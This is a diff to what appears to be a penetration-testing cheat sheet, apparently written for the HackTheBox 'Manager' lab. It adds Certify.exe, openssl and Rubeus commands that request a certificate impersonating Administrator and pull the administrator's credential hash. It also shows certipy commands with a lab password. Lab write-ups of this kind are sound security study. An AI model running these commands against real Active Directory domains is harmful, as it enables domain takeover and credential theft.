@@ -237,6 +237,15 @@ certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.
 certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -retrieve 13
 certipy-ad auth -pfx administrator.pfx
 ```
+Certify.exe
+``` 
+./Certify.exe find /vulnerable /current-user
+.\certify.exe request /ca:dc01.manager.htb\manager-DC01-CA /template:User /altname:Administrator
+将"-----BEGIN RSA PRIVATE KEY-----"到"-----END CERTIFICATE-----"保存为cert.pem文件。
+kali: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx /getcredentials /show /nowrap
+The result include administrator's hash
+```
 ### Authentication
 #### Minikatz(require local admin)
 Load DemoEXE and run it locally.  
